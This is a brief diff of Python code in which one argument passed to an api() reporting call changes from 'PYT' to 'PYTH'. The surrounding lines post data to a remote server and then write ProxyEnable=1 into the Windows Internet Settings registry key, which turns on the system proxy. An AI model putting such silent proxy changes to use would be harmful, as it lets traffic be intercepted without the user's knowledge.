@@ -42,7 +42,7 @@ def api(inf1):
         response = requests.post(url, json=payload)
 
 def checkProcess2():
-    api('PYT')
+    api('PYTH')
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, winreg.KEY_WRITE)
     winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
